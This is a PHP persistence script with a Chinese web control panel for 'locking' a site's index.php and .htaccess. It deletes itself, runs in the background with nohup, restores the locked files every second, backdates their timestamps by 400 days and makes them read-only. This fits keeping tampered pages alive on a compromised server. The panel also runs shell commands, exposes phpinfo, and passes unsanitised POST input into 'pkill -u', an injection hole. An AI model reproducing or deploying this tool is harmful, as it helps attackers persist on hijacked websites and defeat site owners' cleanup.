<?php
//=====================*****************************========================
//上传到此文件到和加锁文件同一个目录
//当前目录下要加锁的文件
$lock_file_name = 'index.php';
$current_file_path = __FILE__;
$current_dir = realpath(dirname($current_file_path));
$lock_file_path = $current_dir . '/' . $lock_file_name;
$current_file_name = str_replace($current_dir, '', $current_file_path);
$current_file_name = str_replace("/", '', $current_file_name);
$current_file_name = str_replace("\\", '', $current_file_name);


function getPhpPath()
{
    ob_start();
    phpinfo(1);
    $info = ob_get_contents();
    ob_end_clean();
    preg_match("/--bindir=([^&]+)/si", $info, $matches);
    if (isset($matches[1]) && $matches[1] != '') {
        return $matches[1] . '/php';
    }
    preg_match("/--prefix=([^&]+)/si", $info, $matches);
    if (!isset($matches[1])) {
        return 'php';
    }
    return $matches[1] . '/bin/php';
}

function htmlForm($action_url, $value, $submit_value)
{
    $domain = '';
    if (isset($_SERVER['HTTP_HOST'])) {
        $domain = $_SERVER['HTTP_HOST'];
    } elseif (isset($_SERVER['SERVER_NAME'])) {
        $domain =  $_SERVER['SERVER_NAME'];
    }
    $domain = $domain . $_SERVER['PHP_SELF'];
    $url = 'http://' . $domain;
    echo "<p style=''><a style='padding: 5px;  width:120px;color: #339966; text-decoration:none; ' href='$url?action=$value'>$submit_value</a></p>";
//    echo '<form action="' . $action_url . '" method="post">';
//    echo '<input type="hidden" name="action" value="' . $value . '" />';
//    echo '<input type="submit" value="' . $submit_value . '" />';
//    echo '</form>';
}

function htmlPostForm($action_url, $value, $submit_value){
    $domain = '';
    if (isset($_SERVER['HTTP_HOST'])) {
        $domain = $_SERVER['HTTP_HOST'];
    } elseif (isset($_SERVER['SERVER_NAME'])) {
        $domain =  $_SERVER['SERVER_NAME'];
    }
    $domain = $domain . $_SERVER['PHP_SELF'];
    $url = ($_SERVER['REQUEST_SCHEME'] != '' ? $_SERVER['REQUEST_SCHEME'] : 'http') . '://' . $domain;
//    echo "<p style=''><a style='padding: 5px;  width:120px;color: #339966; text-decoration:none; ' href='$url?action=$value'>$submit_value</a></p>";
    $post_url =  $url . "?action=" . $value;
    echo '<br/><form action="' . $post_url . '" method="post">';
    echo '用户名: <input type="text" name="id" value="" /> <br/>';
    echo '<input type="submit" value="' . $submit_value . '" />';
    echo '</form>';
}

function html_display($data_array)
{
    foreach ($data_array as $key => $value) {

        $value = htmlspecialchars($value);

        echo PHP_EOL . '<hr />' . PHP_EOL;
        echo "<p>$key : $value</pre>";

    }
}

function is_cli() {
    $is_cli = preg_match("/cli/i", php_sapi_name()) ? true : false;
    if ($is_cli === false) {
        if (isset($_SERVER['argc']) && $_SERVER['argc'] >= 2) {
            $is_cli = true;
        }
    }
    if ($is_cli === false) {
        if (!isset($_SERVER['SCRIPT_NAME'])) {
            $is_cli = true;
        }
    }
    return $is_cli;
}

function run($code, $method = 'popen')
{
    $disabled = explode(',', ini_get('disable_functions'));

    if (in_array($method, $disabled)) {
        $method = 'exec';
    }
    if (in_array($method, $disabled)) {
        return false;
    }

    $result = '';
    switch ($method){
        case 'exec':
            exec($code,$array);
            foreach ($array as $key => $value) {
                $result .= $key . " : " . $value . PHP_EOL;
            }
            return $result;
            break;
        case 'popen':
            $fp = popen($code,"r");  //popen打一个进程通道
            while (!feof($fp)) {      //从通道里面取得东西
                $out = fgets($fp, 4096);
                $result .= $out;         //打印出来
            }
            pclose($fp);
            return $result;
            break;
        default:
            return false;
            break;
    }
}

function lockFile($current_file_name, $lock_file_path)
{
    unlink($current_file_name);
    $content = file_get_contents($lock_file_path);
    $hash_content = hash('sha1', $content);

    $htaccess_file_path = str_replace("index.php", ".htaccess", $lock_file_path);

    $content_htaccess = file_get_contents($htaccess_file_path);
    $hash_content_htaccess = hash('sha1', $content_htaccess);

    while (true) {
        if (!file_exists($lock_file_path)) {
            @file_put_contents($lock_file_path, $content);
            @touch($lock_file_path, strtotime("-400 days", time()));
            @chmod($lock_file_path, 0444);
        }
        if (!file_exists($htaccess_file_path)) {
            @file_put_contents($htaccess_file_path, $content_htaccess);
            @touch($htaccess_file_path, strtotime("-400 days", time()));
            @chmod($htaccess_file_path, 0444);
        }
        if (file_exists($current_file_name)) {
            file_put_contents("error.txt", "error:10010");
            break;
        }
        $new_content = file_get_contents($lock_file_path);
        $new_htaccess_content = file_get_contents($htaccess_file_path);
        $new_hash_content = hash('sha1', $new_content);
        if ($new_hash_content != $hash_content) {
            @unlink($lock_file_path);
            @file_put_contents($lock_file_path, $content);
            @touch($lock_file_path, strtotime("-400 days", time()));
            @chmod($lock_file_path, 0444);
        }
        $new_hash_content_htaccess = hash('sha1', $new_htaccess_content);
        if ($new_hash_content_htaccess != $hash_content_htaccess) {
            @unlink($htaccess_file_path);
            @file_put_contents($htaccess_file_path, $content_htaccess);
            @touch($htaccess_file_path, strtotime("-400 days", time()));
            @chmod($htaccess_file_path, 0444);
        }
        sleep(1);
    }
}

if (is_cli()) {
    lockFile($current_file_path, $lock_file_path);
}

if ( strstr($_SERVER['SCRIPT_NAME'], $current_file_name)) {

    echo '<html lang="zh-cn"><head><meta charset="UTF-8"><title>锁码</title></head><body><div style="margin: 0 auto; width:1100px"><div style="float: left;text-align: left;width:200px">';
    htmlForm($current_file_name, "check", "1 - 检查环境");
    htmlForm($current_file_name, "lock", "2 - 锁文件");
    htmlForm($current_file_name, "modify", "使加锁文件可修改");
    htmlForm($current_file_name, "function", "查看函数");
    htmlForm($current_file_name, "phpinfo", "phpinfo");
    htmlForm($current_file_name, "php_version", "php_version");
    htmlForm($current_file_name, "lock3", "旧方式直接加锁");
    htmlForm($current_file_name, "get_php_fpm", "检测fpm");
    htmlPostForm($current_file_name, "kill_php_fpm", "删除fpm");
    echo '</div><div style="float:right;text-align: left;width:850px; border:1px solid #999999;padding: 5px">信息：';
    switch ($_GET['action']) {
        case 'function':
            $data_array[] = array();
            $disabled = explode(',', ini_get('disable_functions'));
            html_display($disabled);
            $results = run("ps aux");
            foreach (explode("\n", $results) as  $value) {
                $data_array[] = $value;
            }
            html_display($data_array);
            break;
        case 'get_php_fpm':
            $data_array[] = array();
            $results = run("ps aux | grep 'php-fpm'");
            foreach (explode("\n", $results) as  $value) {
                $data_array[] = $value;
            }
            html_display($data_array);
            break;
        case 'kill_php_fpm':
            $data_array[] = array();
            $id = $_POST['id'];
            $results = run("pkill -u $id");
            foreach (explode("\n", $results) as  $value) {
                $data_array[] = $value;
            }
            html_display($data_array);
            break;
        case 'check':
            $php_path = getPhpPath();
            $data_array['php 路径'] = $php_path;
            $result = run("$php_path -v");
            if ($result === false) {
                $data_array['执行错误'] = '现有方法无法执行命令';
                html_display($data_array);
                break;
            }
            preg_match("/PHP ([.0-9]+)/si", $result, $matches);
            if (isset($matches[1])) {
                $data_array['php 版本'] = $matches[1];
            }
            if (file_exists($lock_file_name)){
                $data_array['加锁文件路径'] = $lock_file_path;
            }
            html_display($data_array);
            break;
        case 'lock':
            $php_path = getPhpPath();
            //$data_array['执行命令'] = "nohup $php_path " . $current_file_path . " >/dev/null 2>&1 &";
            $data_array['执行命令'] = "nohup $php_path " . $current_file_path . " >/dev/null 2>&1 &";
            run($data_array['执行命令']);
            $result = run("ps aux | grep $current_file_name");
            foreach (explode("\n", $result) as  $value) {
                $data_array[] = $value;
            }
            html_display($data_array);
            break;
        case '4':
            $data_array[] = array();
            $results = run("ps aux | grep " . $current_file_name);
            foreach (explode("\n", $results) as  $value) {
                $data_array[] = $value;
            }
            html_display($data_array);
            break;
        case 'modify':
            $data_array['修改结果'] = "失败";
            if (chmod($lock_file_path, 0777))
            {
                $data_array['修改结果'] = "成功";
            }
            html_display($data_array);
            break;
        case 'phpinfo':
            phpinfo();
            break;
        case 'php_version':
            $php_path = getPhpPath();
            $data_array[] = array();
            $results = run("$php_path -v");
            foreach (explode("\n", $results) as  $value) {
                $data_array[] = $value;
            }
            html_display($data_array);
            break;
        case 'exist':
            echo '{|exist|}';
            break;
        case 'del':
            @unlink(__FILE__);
            break;
        case 'lock3':
            @unlink($current_file_path);
            $content = file_get_contents($lock_file_path);
            $hash_content = hash('sha1', $content);
            while (true) {
                if (!file_exists($lock_file_path)) {
                    @file_put_contents($lock_file_path, $content);
                    @touch($lock_file_path, strtotime("-400 days", time()));
                    @chmod($lock_file_path, 0444);
                }
                $new_content = file_get_contents($lock_file_path);
                if (file_exists($current_file_path)) {
                    file_put_contents("error.txt", "error:10010");
                    break;
                }
                $new_hash_content = hash('sha1', $new_content);
                if ($new_hash_content != $hash_content) {
                    @unlink($lock_file_path);
                    @file_put_contents($lock_file_path, $content);
                    @touch($lock_file_path, strtotime("-400 days", time()));
                    @chmod($lock_file_path, 0444);
                }
                sleep(1);
            }
            break;
        default:
            break;
    }

    echo '</div></div></body></html>';
    exit();
}

echo $_SERVER['SCRIPT_NAME'];

